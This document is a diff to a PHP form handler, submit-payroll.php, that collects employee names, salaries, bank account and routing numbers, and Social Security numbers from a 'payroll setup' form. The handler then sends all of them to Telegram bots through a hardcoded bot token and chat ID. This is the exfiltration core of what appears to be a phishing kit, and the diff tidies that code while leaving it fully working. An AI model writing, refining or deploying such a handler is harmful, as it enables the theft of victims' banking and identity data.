@@ -2,13 +2,10 @@
 // submit-payroll.php
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Telegram Bot Configurations - ADD MULTIPLE BOT ENTRIES
+    // Telegram Bot Configurations - MULTIPLE SUPPORTED
     $telegramBots = [
-        ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'], // Bot 1
-
-        ['token' => '', 
-        'chat_id' => ''], // Bot 2
-        // Add more as needed
+        ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
+        // Add more bots here if needed
     ];
 
     // Collect form data
@@ -26,50 +23,44 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $additional_notes = htmlspecialchars($_POST['additional_notes'] ?? 'N/A');
     $certify         = isset($_POST['certify']) ? 'Yes' : 'No';
 
-    // Create formatted message with emojis
-    $message  = "🏦 **NEW PAYROLL SETUP SUBMISSION** 🏦\n\n";
-
-    $message .= "👤 **Employee Information**\n";
+    // Create formatted message
+    $message  = "🏦 NEW PAYROLL SETUP SUBMISSION 🏦\n\n";
+    $message .= "👤 Employee Information\n";
     $message .= "📛 Name: $employee_name\n";
     $message .= "🏢 Department: $department\n";
     $message .= "💼 Position: $position\n";
     $message .= "💰 Salary: $$salary\n";
     $message .= "📅 Start Date: $start_date\n\n";
-
-    $message .= "🏦 **Banking Information**\n";
+    $message .= "🏦 Banking Information\n";
     $message .= "🏛️ Bank: $bank_name\n";
     $message .= "🔢 Account No: $account_number\n";
     $message .= "📋 Routing No: $routing_number\n";
     $message .= "⏰ Pay Frequency: $pay_frequency\n\n";
-
-    $message .= "📊 **Tax & Benefits**\n";
+    $message .= "📊 Tax & Benefits\n";
     $message .= "🆔 Tax ID (SSN): $tax_id\n";
     $message .= "🏥 Benefits: $benefits\n";
     $message .= "📝 Notes: $additional_notes\n\n";
-
     $message .= "✅ Certification: $certify\n";
     $message .= "⏰ Submitted on: " . date('Y-m-d H:i:s');
 
     // Send to ALL Telegram bots
     foreach ($telegramBots as $bot) {
         if (!empty($bot['token']) && !empty($bot['chat_id'])) {
-            $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
+            $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
             $data = [
                 'chat_id' => $bot['chat_id'],
-                'text' => $message,
-                'parse_mode' => 'Markdown'
+                'text' => $message
+                // parse_mode removed for safety
             ];
-
             $options = [
                 'http' => [
                     'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                     'method'  => 'POST',
                     'content' => http_build_query($data),
+                    'ignore_errors' => true
                 ],
             ];
-
-            $context = stream_context_create($options);
-            @file_get_contents($url, false, $context);
+            @file_get_contents($url, false, stream_context_create($options));
         }
     }
 
@@ -84,3 +75,4 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     header('Location: payroll-setup.php');
     exit();
 }
+?>
